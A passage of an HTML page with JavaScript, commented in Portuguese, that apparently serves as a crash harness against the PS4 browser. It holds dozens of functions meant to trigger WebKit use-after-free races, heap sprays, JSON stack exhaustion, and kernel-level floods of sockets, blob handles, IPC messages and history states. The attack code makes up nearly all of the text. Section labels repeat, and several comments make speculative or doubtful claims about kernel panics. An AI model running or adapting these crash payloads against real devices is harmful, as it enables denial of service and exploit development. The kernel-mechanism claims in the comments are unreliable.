                    // Conecta a uma porta fechada ou lenta para travar o Kernel Socket
                    xhr.open("GET", "http://127.0.0.1:9999", false);
                    xhr.send(null);
                } catch(e) {}
            }
        `;
        
        // Cria 10 threads travadas
        for(let i=0; i<10; i++) {
            const w = new Worker(URL.createObjectURL(new Blob([code], {type:'text/javascript'})));
            w.postMessage("start");
        }
        
        // Trava também a main thread por um momento
        const xhr = new XMLHttpRequest();
        try {
            xhr.open("GET", "/", false);
            xhr.send();
        } catch(e){}
    }

    // ==========================================
    // KERNEL 05: History.pushState Large Object Flood
    // ==========================================
    // ALVO: Kernel Process Memory Manager.
    // MECÂNICA: Cada estado do histórico salva uma cópia do objeto de estado na memória do Kernel/Processo.
    // Empilhar objetos gigantes rapidamente pode causar OOM (Out Of Memory) no nível do sistema, levando a Panic.
    function crashHistoryFlood() {
        log("Iniciando History Flood...", "danger");
        
        const huge = new Uint8Array(1024 * 1024 * 5); // 5MB
        let count = 0;
        
        function push() {
            try {
                history.pushState(huge, "State " + count, "?p=" + count);
                count++;
                if (count % 100 === 0) log("States pushed: " + count);
                requestAnimationFrame(push);
            } catch(e) {
                log("History Limit: " + e.message);
            }
        }
        push();
    }

    // ==========================================
    // KERNEL 06: LocalStorage Event IPC Storm
    // ==========================================
    // ALVO: IPC (Inter-Process Communication) do Navegador/Kernel.
    // MECÂNICA: Escrever no localStorage dispara um evento 'storage' em TODAS as outras janelas/iframes.
    // Criamos vários iframes e bombardeamos o storage. O Kernel tenta entregar mensagens IPC exponencialmente.
    function crashStorageStorm() {
        log("Iniciando Storage IPC Storm...", "danger");
        
        // Cria ouvintes (amplificadores de IPC)
        for(let i=0; i<10; i++) {
            const ifr = document.createElement('iframe');
            document.body.appendChild(ifr);
            // Cada iframe escuta o evento
            ifr.contentWindow.addEventListener('storage', () => {});
        }
        
        // Bombardeio
        let i = 0;
        setInterval(() => {
            // Mudança rápida de chave dispara evento broadcast
            localStorage.setItem("storm_" + (i++ % 100), Date.now());
        }, 1);
    }
    // WEBKIT 01: XSLT Processor UAF
    // ==========================================
    // ALVO: Libxslt (C Library).
    // MECÂNICA: XSLT permite transformar XML. Se o XSLT alterar o documento que está sendo transformado
    // ou se referenciar nós deletados via 'document()', podemos causar corrupção de memória.
    // É um vetor fortíssimo em ambientes sem JIT, pois roda em código C nativo.
    function crashXSLT() {
        log("Iniciando XSLT Attack...");
        if (!window.XSLTProcessor) return log("XSLT not supported");

        const xsltCode = `
        <xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
            <xsl:template match="/">
                <xsl:for-each select="//node()">
                    <xsl:copy-of select="."/>
                    <xsl:apply-templates select="document('')"/>
                </xsl:for-each>
            </xsl:template>
        </xsl:stylesheet>`;

        const parser = new DOMParser();
        const xsltDoc = parser.parseFromString(xsltCode, "text/xml");
        const xmlDoc = parser.parseFromString("<root><a>payload</a></root>", "text/xml");

        const proc = new XSLTProcessor();
        proc.importStylesheet(xsltDoc);

        try {
            // Transformação que pode estourar ou corromper
            const frag = proc.transformToFragment(xmlDoc, document);
            log("XSLT Finished (Safe)");
        } catch(e) {
            log("XSLT Error: " + e.message);
        }
    }

    // ==========================================
    // WEBKIT 02: NodeIterator Detach
    // ==========================================
    // ALVO: DOM Traversal Engine.
    // MECÂNICA: NodeIterator percorre o DOM. O filtro (acceptNode) roda código JS.
    // Se removermos o nó que está sendo visitado DE DENTRO do filtro, o iterador perde a referência
    // e pode tentar ler um ponteiro para um objeto C++ deletado.
    function crashNodeIterator() {
        log("Iniciando NodeIterator UAF...");
        const root = document.createElement('div');
        const child = document.createElement('span');
        root.appendChild(child);
        document.body.appendChild(root);

        const ni = document.createNodeIterator(root, NodeFilter.SHOW_ELEMENT, {
            acceptNode: function(node) {
                if (node === child) {
                    // VIOLAÇÃO: Remove o nó atual
                    root.removeChild(child);
                    // Suja a memória
                    const trash = new Array(100).fill(1);
                    return NodeFilter.FILTER_ACCEPT;
                }
                return NodeFilter.FILTER_ACCEPT;
            }
        });

        try {
            // Avança o iterador
            ni.nextNode(); // root
            ni.nextNode(); // child (removido durante o acesso)
            
            // Tenta acessar o nó corrente que deveria estar morto
            const zombie = ni.referenceNode;
            if (zombie) log("NodeIterator survived (Safe)");
        } catch(e) {
            log("NodeIterator Error: " + e.message);
        }
        if(root.parentNode) document.body.removeChild(root);
    }

    // ==========================================
    // WEBKIT 03: TextEncoder Buffer Overflow
    // ==========================================
    // ALVO: String Encoding API (C++ Implementation).
    // MECÂNICA: Converter strings gigantes para Uint8Array.
    // Se a string contiver caracteres Unicode complexos (surrogate pairs) no final do buffer,
    // o cálculo de tamanho do buffer de destino pode estar errado (off-by-one).
    function crashTextEncoder() {
        log("Iniciando TextEncoder Overflow...");
        if (!window.TextEncoder) return log("TextEncoder not supported");

        // String terminando com meio surrogate pair
        let str = "A".repeat(1024 * 1024);
        str += "\uD800"; // High surrogate sem Low surrogate

        const encoder = new TextEncoder();
        
        try {
            // Tenta codificar para um buffer existente com offset
            const buffer = new Uint8Array(str.length * 3); // Espaço generoso
            const res = encoder.encodeInto(str, buffer);
            
            log("Encoded: " + res.written + " bytes (Safe)");
        } catch(e) {
            log("Encoder Error: " + e.message);
        }
    }

    // ==========================================
    // KERNEL 04: WebSocket Close Race
    // ==========================================
    // ALVO: FreeBSD TCP Stack / Socket Layer.
    // MECÂNICA: Abrir e fechar sockets rapidamente estressa o gerenciamento de PCBs (Protocol Control Blocks) no Kernel.
    // Sem WebRTC, esta é a melhor forma de atingir a pilha de rede.
    function crashWebSocket() {
        log("Iniciando WebSocket Race...", "danger");
        
        // Loop rápido
        const interval = setInterval(() => {
            try {
                // Conecta a uma porta local aleatória para falhar rápido ou conectar
                const ws = new WebSocket("ws://127.0.0.1:" + (Math.floor(Math.random() * 5000) + 8000));
                
                ws.onopen = () => ws.close();
                ws.onerror = () => {}; // Ignora erros
                
                // Race: Fecha imediatamente antes de conectar
                ws.close();
            } catch(e) {}
        }, 5);

        // Para depois de 10s para não travar a UI para sempre
        setTimeout(() => {
            clearInterval(interval);
            log("WebSocket Race Paused");
        }, 10000);
    }

    // ==========================================
    // KERNEL 05: Blob URL Handle Exhaustion
    // ==========================================
    // ALVO: Kernel Resource Limits (File Handles/SHM).
    // MECÂNICA: Cada URL de Blob consome um handle no kernel ou memória compartilhada.
    // O PS4 tem limites rígidos. Se criarmos milhares sem revogar, podemos causar pânico no VFS ou OOM de Kernel.
    function crashBlobHandles() {
        log("Iniciando Blob Exhaustion...", "danger");
        const chunk = new Uint8Array(1024).fill(0x41); // 1KB
        const blobs = [];
        
        let count = 0;
        function spam() {
            try {
                for(let i=0; i<100; i++) {
                    const b = new Blob([chunk]);
                    const u = URL.createObjectURL(b);
                    blobs.push(u); // Mantém referência para não ser coletado pelo GC JS
                    count++;
                }
                if (count % 1000 === 0) log("Blobs: " + count);
                // Continua até explodir
                requestAnimationFrame(spam);
            } catch(e) {
                log("Blob Limit Hit: " + e.message);
            }
        }
        spam();
    }

    // ==========================================
    // KERNEL 06: Gamepad API Hotplug
    // ==========================================
    // ALVO: Input Driver / USB Stack.
    // MECÂNICA: A API Gamepad dispara eventos quando controles são conectados.
    // Acessar `navigator.getGamepads()` em loop apertado enquanto simulamos eventos (se possível) ou apenas polling massivo
    // pode estressar o driver de entrada, especialmente se houver memory leak na implementação do polling.
    function crashGamepad() {
        log("Iniciando Gamepad Polling...", "danger");
        
        function poll() {
            const gps = navigator.getGamepads();
            // Apenas ler a lista força o driver a consultar o hardware
            if (gps[0]) {
                // Se houver controle, lê botões para gerar tráfego de interrupção
                const btn = gps[0].buttons[0].pressed;
            }
            // Loop infinito sem espera (requestAnimationFrame é throttled, setTimeout(0) é mais agressivo aqui)
            setTimeout(poll, 0);
        }
        poll();
        
        // Adiciona listeners para spammar log se houver evento real
        window.addEventListener("gamepadconnected", () => log("Gamepad Connected event"));
        window.addEventListener("gamepaddisconnected", () => log("Gamepad Disconnected event"));
    }
   // WEBKIT 01: document.write Re-entrancy
    // ==========================================
    // ALVO: HTML Parser.
    // MECÂNICA: document.write() invoca o parser. Se chamado de dentro de um script
    // que está sendo executado pelo parser (ex: em um iframe que está carregando),
    // podemos corromper o estado interno do parser (UAF ou State Confusion).
    function crashDocWrite() {
        log("Iniciando DocWrite Re-entrancy...");
        const ifr = document.createElement('iframe');
        document.body.appendChild(ifr);
        
        try {
            const doc = ifr.contentDocument;
            doc.open();
            // Escreve um script que escreve outro script que destroi o iframe
            doc.write(`
                <script>
                    parent.document.body.removeChild(window.frameElement);
                    document.write("<script>console.log('Surived?');<\\/script>");
                <\\/script>
            `);
            doc.close();
            log("DocWrite Finished (Safe)");
        } catch(e) {
            log("DocWrite Error: " + e.message);
        }
    }

    // ==========================================
    // WEBKIT 02: JSON.parse Stack Smash
    // ==========================================
    // ALVO: JavaScriptCore Stack.
    // MECÂNICA: O parser JSON usa recursão. Criar uma string JSON com milhares de arrays aninhados
    // ([[[[[...]]]]]) força o motor a empilhar frames de função. Em sistemas com stack limitada, isso causa crash.
    function crashJSONStack() {
        log("Iniciando JSON Stack Smash...");
        // Cria profundidade de 50.000 níveis (muito além do normal)
        let json = "";
        const depth = 50000;
        
        for(let i=0; i<depth; i++) json += "[";
        for(let i=0; i<depth; i++) json += "]";
        
        try {
            JSON.parse(json);
            log("JSON Parse Finished (Safe)");
        } catch(e) {
            log("JSON Error: " + e.message);
        }
    }

    // ==========================================
    // WEBKIT 03: CSS Rules Heap Spray
    // ==========================================
    // ALVO: WebCore CSS Engine.
    // MECÂNICA: Inserir milhões de regras CSS dinamicamente força alocações massivas no Heap.
    // Isso pode fragmentar a memória ou causar falhas no gerenciamento de estilos.
    function crashCSSRules() {
        log("Iniciando CSS Heap Spray...");
        const style = document.createElement('style');
        document.head.appendChild(style);
        const sheet = style.sheet;
        
        try {
            // Tenta inserir 50.000 regras complexas
            for(let i=0; i<50000; i++) {
                // Seletores complexos consomem mais memória
                sheet.insertRule(`.class${i} > div:nth-child(2n) + span { color: rgb(${i%255},0,0); }`, 0);
            }
            log("CSS Rules Inserted: " + sheet.cssRules.length);
        } catch(e) {
            log("CSS Limit Hit: " + e.message);
        }
    }

    // ==========================================
    // KERNEL 04: BroadcastChannel IPC Storm
    // ==========================================
    // ALVO: Kernel IPC / Message Queues.
    // MECÂNICA: BroadcastChannel permite comunicação entre contextos.
    // Enviar mensagens grandes em alta frequência obriga o Kernel a gerenciar filas de mensagens.
    // Pode causar esgotamento de memória de kernel (kmem).
    function crashBroadcast() {
        log("Iniciando Broadcast Storm...", "danger");
        const bc = new BroadcastChannel("system_shock");
        const payload = new Uint8Array(1024 * 64).fill(0xCC); // 64KB
        
        // Cria ouvintes para amplificar o tráfego
        const listener = new BroadcastChannel("system_shock");
        listener.onmessage = () => {}; // No-op, apenas força entrega
        
        let count = 0;
        function flood() {
            try {
                for(let i=0; i<100; i++) {
                    bc.postMessage(payload);
                    count++;
                }
                if(count % 1000 === 0) log("Msgs Sent: " + count);
                requestAnimationFrame(flood);
            } catch(e) {
                log("Broadcast Error: " + e.message);
            }
        }
        flood();
    }

    // ==========================================
    // KERNEL 05: Blob Fragmentation (VFS Stress)
    // ==========================================
    // ALVO: Virtual File System (Metadata).
    // MECÂNICA: Criamos um Blob composto por milhares de pequenos Blobs.
    // O Kernel precisa manter uma lista de "partes" para esse arquivo virtual.
    // Listas de partes excessivamente longas podem estourar buffers internos do VFS.
    function crashBlobFrag() {
        log("Iniciando Blob Fragmentation...", "danger");
        let parts = [];
        const chunk = new Blob(["A"]); // 1 Byte
        
        // Cria array com 100.000 referências ao mesmo chunk
        for(let i=0; i<100000; i++) parts.push(chunk);
        
        try {
            // Cria o "Mega Blob" fragmentado
            const fragBlob = new Blob(parts);
            
            // Força o Kernel a resolver a estrutura lendo-o
            const fr = new FileReader();
            fr.readAsText(fragBlob);
            fr.onload = () => log("Blob Read Safe");
            fr.onerror = () => log("Blob Read Error");
        } catch(e) {
            log("Blob Error: " + e.message);
        }
    }

    // ==========================================
    // KERNEL 06: Console Buffer Overflow
    // ==========================================
    // ALVO: Kernel Logger / UART Driver.
    // MECÂNICA: console.log no PS4 muitas vezes escreve para um buffer de sistema ou UART (para debug).
    // Escrever gigabytes de texto em alta velocidade pode causar "buffer overrun" no driver de log,
    // levando a congelamentos ou panics se o buffer for circular e mal implementado.
    function crashConsole() {
        log("Iniciando Console Flood...", "danger");
        const junk = "ERR_OVERFLOW_".repeat(100); // ~1KB string
        
        let i = 0;
        const interval = setInterval(() => {
            // Tenta 100 logs por tick
            for(let j=0; j<100; j++) {
                console.log(i++ + " " + junk);
                // console.error força flush diferente em alguns sistemas
                console.error(i++ + " " + junk);
            }
            if (i > 100000) {
                clearInterval(interval);
                log("Console Flood Done");
            }
        }, 5);
    }
   // WEBKIT 01: Worker Terminate UAF
    // ==========================================
    // ALVO: Worker Thread Manager.
    // MECÂNICA: Transferimos um ArrayBuffer para um Worker. Imediatamente chamamos .terminate().
    // O WebKit tenta limpar a memória do Worker. Se houver uma referência pendente (dangling) na thread principal
    // ou se o Garbage Collector tentar marcar o buffer durante a destruição, ocorre UAF.
    function crashWorkerTerm() {
        log("Iniciando Worker Terminate Race...");
        
        // Código do Worker
        const blob = new Blob(["onmessage = function(e) { postMessage(e.data, [e.data]); }"], {type: "text/javascript"});
        const url = URL.createObjectURL(blob);
        
        for(let i=0; i<100; i++) {
            const w = new Worker(url);
            const ab = new ArrayBuffer(1024 * 1024); // 1MB
            
            // Envia buffer transferível
            w.postMessage(ab, [ab]);
            
            // Race: Mata a thread imediatamente
            w.terminate();
            
            // Tenta acessar o buffer (que deveria estar neutered/transferido)
            if (ab.byteLength > 0) log("Buffer not transferred (Race condition)");
        }
        log("Worker Race Batch Finished");
    }

    // ==========================================
    // WEBKIT 02: XHR ResponseType Switching Race
    // ==========================================
    // ALVO: XMLHttpRequest C++ Parser.
    // MECÂNICA: Iniciamos um download. No meio do recebimento de dados (readyState 3),
    // trocamos o `responseType` de 'text' para 'arraybuffer' ou 'document'.
    // O motor C++ pode ter alocado um buffer para texto e tentar escrever binário, ou vice-versa.
    function crashXHRType() {
        log("Iniciando XHR Type Confusion...");
        
        try {
            const xhr = new XMLHttpRequest();
            // Usa um arquivo local grande ou endpoint lento
            xhr.open("GET", "/", true);
            
            xhr.onreadystatechange = function() {
                if (xhr.readyState === 3) { // Loading
                    try {
                        // MUTATION: Troca o tipo de resposta no meio do stream
                        xhr.responseType = "arraybuffer";
                        const leak = xhr.response; // Tenta ler imediatamente
                    } catch(e) {}
                    
                    try {
                        xhr.responseType = "document"; // Troca novamente
                    } catch(e) {}
                }
            };
            xhr.send();
            log("XHR Request Sent");
        } catch(e) {
            log("XHR Error: " + e.message);
        }
    }

    // ==========================================
    // WEBKIT 03: TextTrack Cue Flood
    // ==========================================
    // ALVO: HTMLMediaElement Track Engine.
    // MECÂNICA: Elementos de vídeo possuem faixas de legenda (TextTrack).
    // Adicionar milhares de Cues (legendas) força o motor a ordenar e renderizar overlays.
    // Implementações antigas usam vetores de tamanho fixo ou algoritmos de sort O(n^2) que travam a memória.
    function crashTextTrack() {
        log("Iniciando TextTrack Flood...");
        const video = document.createElement('video');
        const track = video.addTextTrack("subtitles", "Crash", "en");
        track.mode = "showing";
        
        try {
            // Adiciona 50.000 cues
            for(let i=0; i<50000; i++) {
                // VTTCue ou TextTrackCue dependendo da versão
                const Cue = window.VTTCue || window.TextTrackCue;
                if (!Cue) break;
                
                const cue = new Cue(i, i+1, "Payload " + i);
                track.addCue(cue);
            }
            log("Cues added: " + track.cues.length);
        } catch(e) {
            log("TextTrack Limit: " + e.message);
        }
    }

    // ==========================================
    // KERNEL 04: MessagePort Ping-Pong Lock
    // ==========================================
    // ALVO: Kernel IPC Mutex.
    // MECÂNICA: Dois Workers trocam mensagens entre si o mais rápido possível (Ping-Pong).
    // Isso gera uma carga massiva de "context switches" e aquisição de locks no Kernel.
    // Pode causar Deadlock se o scheduler não priorizar corretamente.
    function crashPingPong() {
        log("Iniciando IPC Ping-Pong...", "danger");
        
        const code = `
            onmessage = function(e) {
                // Responde imediatamente
                e.source.postMessage("pong");
            }
        `;
        const blob = new Blob([code], {type: "text/javascript"});
        
        const w1 = new Worker(URL.createObjectURL(blob));
        const w2 = new Worker(URL.createObjectURL(blob));
        
        const ch = new MessageChannel();
        
        // Conecta w1 e w2 diretamente
        // w1 recebe porta do ch1
        // w2 recebe porta do ch2
        // Isso cria um loop fora da main thread
        // (Nota: Simplificado aqui para flood da main thread para workers)
        
        let count = 0;
        ch.port1.onmessage = () => {
            count++;
            ch.port1.postMessage("ping"); // Loop infinito
        };
        
        ch.port1.postMessage("start");
        
        // Monitor
        setInterval(() => log("IPC Rate: " + count + "/s"), 1000);
    }

    // ==========================================
    // KERNEL 05: Fetch Keep-Alive Flood
    // ==========================================
    // ALVO: TCP Stack / Socket Buffers.
    // MECÂNICA: A flag `keepalive: true` no fetch instrui o navegador/kernel a manter a conexão aberta
    // mesmo após a página ser fechada (teoricamente).
    // Abrir milhares de conexões persistentes esgota a tabela de descritores de arquivo do sistema.
    function crashKeepAlive() {
        log("Iniciando Keep-Alive Flood...", "danger");
        
        let count = 0;
        const interval = setInterval(() => {
            for(let i=0; i<50; i++) {
                fetch("/", { keepalive: true, method: "HEAD" }).catch(()=>{});
                count++;
            }
            if(count > 5000) {
                clearInterval(interval);
                log("Flood Dispatched: 5000 sockets");
            }
        }, 10);
    }

    // ==========================================
    // KERNEL 06: MessagePort Recursive Transfer
    // ==========================================
    // ALVO: Kernel Reference Counting.
    // MECÂNICA: Tentamos transferir uma porta através dela mesma, ou criar um ciclo de portas
    // (A envia B, B envia C, C envia A).
    // O Kernel precisa resolver onde entregar a mensagem. Ciclos podem causar loops infinitos no kernel space ou memory leaks de IPC.
    function crashPortLoop() {
        log("Iniciando Port Loop...", "danger");
        const ch1 = new MessageChannel();
        const ch2 = new MessageChannel();
        
        try {
            // Tenta criar um nó na cabeça do Kernel
            ch1.port1.postMessage("cycle", [ch2.port1]);
            ch2.port1.postMessage("cycle", [ch1.port1]);
            
            // Fecha as portas "de fora" para deixar as mensagens órfãs no buffer do kernel
            ch1.port2.close();
            ch2.port2.close();
            
            log("Port Loop Created (Wait for panic)");
        } catch(e) {
            log("Port Error: " + e.message);
        }
    }

</script>

</body>
</html>
